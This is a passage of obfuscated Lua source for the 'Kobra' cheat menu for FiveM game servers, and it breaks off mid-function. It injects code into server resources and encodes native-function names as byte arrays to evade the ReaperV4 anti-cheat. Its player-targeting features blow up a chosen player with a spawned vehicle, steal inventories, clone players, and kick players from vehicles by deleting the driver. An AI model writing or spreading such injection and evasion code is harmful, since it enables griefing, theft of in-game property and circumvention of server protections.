                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v383));end},{type="scrollable",label="Animal Peds",scrollType="onEnter",value=1,values={"Boar","Cat","Chicken","Chimp","Cow","Coyote","Crow","Deer","Dolphin","Fish","Hen","Humpback","Husky","Killer Whale","Mountain Lion","Pig","Pigeon","Poodle","Pug","Poodle","Rabbit","Rat","Retriever","Rhesus Monkey","Rottweiler","Seagull","Shepherd","Stingray","Tiger Shark","Hammerhead Shark","Cow","Cat2","Chickenhawk","Cormorant","Coyote2","Chimp2","Boar2","Deer2","Fish2","Husky2","Pug2","Poodle2","Retriever2","Shepherd2","Rat2","Rabbit2","Dolphin2","Killer Whale2","Mountain Lion2","Pig2","Seagull2","Stingray2","Tiger Shark2","Hammerhead Shark2"},onSelect=function(v384) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(v384));end}}}}},{icon="",label="Server",type="subMenu",categories={{label="List",tabs={{type="button",label="Select Everyone"},{type="button",label="Un-Select Everyone"},{type="button",label="Clear Selection"},{type="divider",label="Nearby Players"}}},{label="Safe",tabs={{type="button",label="Teleport to Player",desc="This will teleport you to the selected player",onSelect=function() local v385=0 + 0 ;local v386;while true do if (v385==1) then if v386 then local v863=0 + 0 ;local v864;local v865;local v866;local v867;while true do if (v863==(1802 -(1070 + 731))) then v865=GetPlayerPed(v864);v866=GetEntityCoords(v865);v863=2 + 0 ;end if (v863==2) then v867=GetEntityHeading(v865);SetEntityCoords(PlayerPedId(),v866.x,v866.y,v866.z,false,false,false,false);v863=1407 -(1257 + 147) ;end if ((0 + 0)==v863) then v864=GetPlayerFromServerId(v386);if ((v864== -(1 -0)) or  not DoesEntityExist(GetPlayerPed(v864))) then v281:Notify("error","Kobra","There was an error while trying to teleport to that player! (ERR:1)",3000);v27[v386]=nil;v12:UpdateListMenu();return;end v863=134 -(98 + 35) ;end if (v863==(2 + 1)) then SetEntityHeading(PlayerPedId(),v867);v281:Notify("success","Kobra",("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v386)),v386),10624 -7624 );break;end end else v281:Notify("error","Kobra","You must select a player to do this!",10096 -7096 );end break;end if (v385==0) then v386=nil;for v772,v773 in pairs(v27) do if v773 then v386=v772;break;end end v385=1;end end end},{type="checkbox",label="Spectate Player",checked=false,desc="This will attempt to Spectate the player",onSelect=function(v387) local v388=0 + 0 ;local v389;while true do if (v388==(0 + 0)) then v389=nil;for v774,v775 in pairs(v27) do if v775 then v389=v774;break;end end v388=558 -(395 + 162) ;end if ((1 + 0)==v388) then v281:HandleSpectateToggle(v389,v387);break;end end end},{type="button",label="Copy Appearance",desc="Copy Players Clothing",onSelect=function() local v390={};for v533,v534 in pairs(v27) do if v534 then v390[ #v390 + (1 -0) ]=v533;end end if ( #v390==(1148 -(701 + 447))) then local v568=0 -0 ;while true do if (v568==(0 -0)) then v281:Notify("error","Kobra","You must select a player to do this!",4341 -(391 + 950) );return;end end end local v391=v390[2 -1 ];local v392=GetResourceState("ReaperV4")=="started" ;if v392 then MachoInjectThread(0 -0 ,"any","",string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]],v391));else local v569=0 -0 ;local v570;local v571;local v572;local v573;local v574;while true do if (v569==(1 + 0)) then v572=nil;function v572(v908) local v909=0 + 0 ;local v910;local v911;while true do if (v909==0) then v910=v571(v908);v911=_G[v910];v909=3 -2 ;end if (v909==(1523 -(251 + 1271))) then return v911;end end end v573=nil;function v573(v912) local v913=0 + 0 ;local v914;while true do if (v913==1) then return  -(2 -1);end if (v913==(0 -0)) then v914=v572(v570("GetActivePlayers"))();for v1205,v1206 in ipairs(v914) do if (v572(v570("GetPlayerServerId"))(v1206)==v912) then return v1206;end end v913=1 -0 ;end end end v569=2;end if (v569==(1261 -(1147 + 112))) then v574=nil;function v574(v915) local v916=v573(v915);if (v916== -(1 + 0)) then local v1017=0 -0 ;while true do if (v1017==(0 + 0)) then print("^1[ERROR] Client ID not found for Server ID: "   .. v915   .. "^0" );return;end end end local v917=v572(v570("GetPlayerPed"))(v916);local v918=v572(v570("PlayerPedId"))();if (v572(v570("DoesEntityExist"))(v917) and v572(v570("DoesEntityExist"))(v918)) then local v1018=697 -(335 + 362) ;while true do if (v1018==(2 + 0)) then v572(v570("SetPedPropIndex"))(v918,1,v572(v570("GetPedPropIndex"))(v917,1),v572(v570("GetPedPropTextureIndex"))(v917,1),true);v572(v570("SetPedPropIndex"))(v918,2 -0 ,v572(v570("GetPedPropIndex"))(v917,2),v572(v570("GetPedPropTextureIndex"))(v917,2),true);print("^2[Kobra] Clothing copied successfully!^0");break;end if (v1018==(2 -1)) then v572(v570("SetPedComponentVariation"))(v918,6,v572(v570("GetPedDrawableVariation"))(v917,6),v572(v570("GetPedTextureVariation"))(v917,22 -16 ),0 -0 );v572(v570("SetPedComponentVariation"))(v918,22 -14 ,v572(v570("GetPedDrawableVariation"))(v917,574 -(237 + 329) ),v572(v570("GetPedTextureVariation"))(v917,8),0 -0 );v572(v570("SetPedComponentVariation"))(v918,11,v572(v570("GetPedDrawableVariation"))(v917,8 + 3 ),v572(v570("GetPedTextureVariation"))(v917,11),0 + 0 );v572(v570("SetPedPropIndex"))(v918,1124 -(408 + 716) ,v572(v570("GetPedPropIndex"))(v917,0 -0 ),v572(v570("GetPedPropTextureIndex"))(v917,821 -(344 + 477) ),true);v1018=1 + 1 ;end if (v1018==(1761 -(1188 + 573))) then print("^2[Kobra] Copying clothing from Server ID: "   .. v915   .. "^0" );v572(v570("SetPedComponentVariation"))(v918,2 -1 ,v572(v570("GetPedDrawableVariation"))(v917,1),v572(v570("GetPedTextureVariation"))(v917,1 + 0 ),0);v572(v570("SetPedComponentVariation"))(v918,3,v572(v570("GetPedDrawableVariation"))(v917,3),v572(v570("GetPedTextureVariation"))(v917,3),0);v572(v570("SetPedComponentVariation"))(v918,4,v572(v570("GetPedDrawableVariation"))(v917,12 -8 ),v572(v570("GetPedTextureVariation"))(v917,4),0 -0 );v1018=2 -1 ;end end else print("^3[WARNING] Target or local ped does not exist.^0");end end v574(v391);break;end if (v569==(1529 -(508 + 1021))) then v570=nil;function v570(v919) local v920=0 + 0 ;local v921;while true do if (v920==1) then return v921;end if ((1166 -(228 + 938))==v920) then v921={};for v1207=686 -(332 + 353) , #v919 do v921[v1207]=string.byte(v919,v1207);end v920=1 -0 ;end end end v571=nil;function v571(v922) local v923=0 -0 ;local v924;while true do if ((0 + 0)==v923) then v924="";for v1209=1, #v922 do v924=v924   .. string.char(v922[v1209]) ;end v923=1 + 0 ;end if (v923==(3 -2)) then return v924;end end end v569=424 -(18 + 405) ;end end end v281:Notify("success","Kobra","Copied clothing!",2292 + 2708 );end},{type="button",label="Launch Player",desc="This will attempt to launch the player into the sky",onSelect=function() local v393=0 -0 ;local v394;while true do if (v393==(978 -(194 + 784))) then v394={};for v776,v777 in pairs(v27) do if v777 then v394[ #v394 + (1771 -(694 + 1076)) ]=v776;end end v393=1905 -(122 + 1782) ;end if (v393==(2 + 0)) then v281:Notify("success","Kobra","Attempting to TEST",4661 + 339 );break;end if (v393==(1 + 0)) then if ( #v394==0) then local v868=0;while true do if (v868==(0 + 0)) then v281:Notify("error","Kobra","You must select a player to do this!",8788 -5788 );return;end end end v281:HandleLaunchPlayer(v394);v393=2 + 0 ;end end end}}},{label="Risky",tabs={{type="button",label="Explode Player",desc="This will attempt to explode the player using a vehicle",onSelect=function() local v395=0 -0 ;local v396;while true do if (v395==(1 + 1)) then v12:UpdateListMenu();break;end if (v395==(1 + 0)) then if ( #v396==(585 -(217 + 368))) then local v869=0 -0 ;while true do if (0==v869) then v281:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end for v778,v779 in ipairs(v396) do local v780=0;local v781;local v782;while true do if ((0 + 0)==v780) then v781=v779;v782=GetPlayerFromServerId(v779);v780=1;end if ((1 + 0)==v780) then if ((v782== -1) or  not DoesEntityExist(GetPlayerPed(v782))) then local v1144=0 + 0 ;while true do if (v1144==(890 -(844 + 45))) then return;end if (v1144==0) then v281:Notify("error","Kobra","You must select a player to do this!",3284 -(242 + 42) );v27[v779]=nil;v1144=1 -0 ;end end else local v1145=0 -0 ;local v1146;while true do if (v1145==(1201 -(132 + 1068))) then v281:Notify("success","Kobra","Attempting to Explode Player",5000);break;end if ((0 -0)==v1145) then v1146=[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]]   .. tostring(v781)   .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]] ;MachoInjectResourceRaw("any",v1146,v781);v1145=1624 -(214 + 1409) ;end end end break;end end end v395=2;end if (v395==(0 + 0)) then v396={};for v783,v784 in pairs(v27) do if v784 then v396[ #v396 + (1635 -(497 + 1137)) ]=v783;end end v395=1;end end end},{type="button",label="Steal Inventory",desc="This will attempt to open the selected players inventory",onSelect=function() local v397=289 -(181 + 108) ;local v398;while true do if (v397==(1 + 0)) then if ( #v398==(0 -0)) then local v870=0 -0 ;while true do if (v870==(0 + 0)) then v281:Notify("error","Kobra","You must select a player to do this!",1871 + 1129 );return;end end end v281:HandleTakeInventory(v398);v397=2;end if (v397==0) then v398={};for v785,v786 in pairs(v27) do if v786 then v398[ #v398 + (477 -(296 + 180)) ]=v785;end end v397=1404 -(1183 + 220) ;end if (v397==(1267 -(1037 + 228))) then v281:Notify("success","Kobra","Attempting to steal inventory",8093 -3093 );break;end end end},{type="divider",label="Ped Options"},{type="button",label="Clone Player",onSelect=function() local v399=0 -0 ;local v400;while true do if (v399==(6 -4)) then v281:Notify("success","Kobra","Cloned Player",5734 -(527 + 207) );break;end if (v399==1) then if ( #v400==(527 -(187 + 340))) then v281:Notify("error","Kobra","You must select a player to do this!",3000);return;end v281:HandleClonePlayer(v400);v399=2;end if ((1870 -(1298 + 572))==v399) then v400={};for v787,v788 in pairs(v27) do if v788 then v400[ #v400 + (2 -1) ]=v787;end end v399=1;end end end},{type="button",label="Attack Clone Player",onSelect=function() local v401=0;local v402;while true do if ((0 -0)==v401) then v402={};for v789,v790 in pairs(v27) do if v790 then v402[ #v402 + 1 ]=v789;end end v401=2 -1 ;end if (v401==(1 + 1)) then v281:Notify("success","Kobra","Cloned Player",13628 -8628 );break;end if (v401==(2 -1)) then if ( #v402==0) then v281:Notify("error","Kobra","You must select a player to do this!",14543 -11543 );return;end v281:HandleAttackClonePlayer(v402);v401=2 + 0 ;end end end},{type="divider",label="Vehicle Options"},{type="scrollable",label="Attach Vehicle",scrollType="onEnter",value=1,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","kuruma","zentorno","entityxf","carbonizzare","elegy","massacro","vagner","nightshark","banshee","feltzer2","ruston","bullet","elegy2"},onSelect=function(v403) local v404=0 + 0 ;local v405;while true do if (v404==1) then if ( #v405==(1646 -(73 + 1573))) then v281:Notify("error","Kobra","You must select a player to do this!",3000);return;end v12:AttachSelectedVehicle(v405,v403);v404=2;end if (v404==(1390 -(1307 + 81))) then v281:Notify("success","Kobra","Vehicle Attached to "   ..  #v405   .. " Player(s)" ,5234 -(7 + 227) );break;end if (0==v404) then v405={};for v791,v792 in pairs(v27) do if v792 then v405[ #v405 + 1 ]=v791;end end v404=1 -0 ;end end end},{type="divider",label="Object Options"},{type="scrollable",label="Vehicle Object",scrollType="onEnter",value=1,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","zentorno","tampa","nightshark","kuruma","buffalo","massacro","ferrari","comet2","issi2","vindicator","baller","baller2"},onSelect=function(v406) local v407={};for v535,v536 in pairs(v27) do if v536 then v407[ #v407 + 1 + 0 ]=v535;end end if ( #v407==(0 + 0)) then local v575=0 + 0 ;while true do if (v575==(976 -(230 + 746))) then v281:Notify("error","Kobra","You must select at least one player!",3601 -(473 + 128) );return;end end end v12.GetSelectedObjectModel=function(v537) return v406;end;v12:SpawnSelectedObject(v407);end},{type="scrollable",label="Attach Prop",scrollType="onEnter",value=1,values={"prop_barrel_02a","prop_cone_float_1","prop_chair_01a","prop_boombox_01","prop_tool_broom","prop_golf_ball","prop_laptop_01a","prop_trafficcone_01a","prop_pizza_box_01","prop_mb_cargo_01a","prop_ld_crate_01a","prop_ld_fueldoor","prop_ld_greenscreen_01","prop_ld_shovel","prop_snow_bottle","prop_snow_locker_01","prop_dummy_01","prop_dummy_02"},onSelect=function(v409) local v410=1244 -(334 + 910) ;local v411;while true do if (v410==(897 -(92 + 803))) then v12:SpawnSelectedObject(v411);v281:Notify("success","Kobra","Spawned object '"   .. tostring(v409)   .. "' for "   ..  #v411   .. " player(s)." ,2755 + 2245 );break;end if (v410==(1181 -(1035 + 146))) then v411={};for v793,v794 in pairs(v27) do if v794 then v411[ #v411 + 1 ]=v793;end end v410=617 -(230 + 386) ;end if (v410==(1 + 0)) then if ( #v411==0) then local v871=1510 -(353 + 1157) ;while true do if (v871==(1114 -(53 + 1061))) then v281:Notify("error","Kobra","You must select at least one player!",4635 -(1568 + 67) );return;end end end v12.GetSelectedObjectModel=function(v795) return v409;end;v410=2;end end end},{type="scrollable",label="Attach Furniture",scrollType="onEnter",value=1,values={"prop_table_01","prop_table_02","prop_table_03","prop_chair_02","prop_chair_03","prop_chair_04a","prop_sofa_01","prop_sofa_02","prop_sofa_03","prop_bed_01","prop_bed_02","prop_lamp_01","prop_lamp_02","prop_lamp_03","prop_couch_01","prop_couch_02","prop_tv_01","prop_tv_02","prop_tv_03","prop_computer_01","prop_computer_02","prop_monitor_01","prop_monitor_02"},onSelect=function(v412) local v413=0 -0 ;local v414;while true do if (v413==(2 + 0)) then v12:SpawnSelectedObject(v414);break;end if (v413==(1977 -(286 + 1690))) then if ( #v414==0) then local v872=0;while true do if (v872==0) then v281:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v796) return v412;end;v413=913 -(98 + 813) ;end if (v413==(0 + 0)) then v414={};for v797,v798 in pairs(v27) do if v798 then v414[ #v414 + (2 -1) ]=v797;end end v413=1;end end end},{type="scrollable",label="Attach Misc",scrollType="onEnter",value=1 + 0 ,values={"prop_beer_bottle","prop_soda_cup","prop_papercup_01","prop_cup_coffee_01","prop_champ_flute","prop_cs_burger_01","prop_cs_burger_02","prop_cs_hotdog_01","prop_cs_pizza_01","prop_cs_sandwich_01","prop_cs_juice_01"},onSelect=function(v415) local v416={};for v538,v539 in pairs(v27) do if v539 then v416[ #v416 + (1528 -(629 + 898)) ]=v538;end end if ( #v416==(0 -0)) then local v576=0 -0 ;while true do if (v576==0) then v281:Notify("error","Kobra","You must select at least one player!",3365 -(12 + 353) );return;end end end v12.GetSelectedObjectModel=function(v540) return v415;end;v12:SpawnSelectedObject(v416);v281:Notify("success","Kobra","Spawned object '"   .. tostring(v415)   .. "' for "   ..  #v416   .. " player(s)." ,6911 -(1680 + 231) );end}}},{label="Vehicle",tabs={{type="button",label="Kick From Vehicle",onSelect=function() local v418=nil;for v541,v542 in pairs(v27) do if v542 then v418=v541;break;end end if v418 then local v577=0 + 0 ;local v578;while true do if (v577==(1149 -(212 + 937))) then v578=GetPlayerFromServerId(v418);if (v578== -1) then local v976=0;while true do if (v976==(1 + 0)) then v12:UpdateListMenu();return;end if (0==v976) then v281:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",4062 -(111 + 951) );v27[v418]=nil;v976=1 + 0 ;end end end v577=28 -(18 + 9) ;end if (v577==(1 + 1)) then v27[v418]=true;v281:UpdateListMenu();break;end if (v577==(535 -(31 + 503))) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v578))) then v281:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",4632 -(595 + 1037) );return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1019=1445 -(189 + 1255) ,1 + 1  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
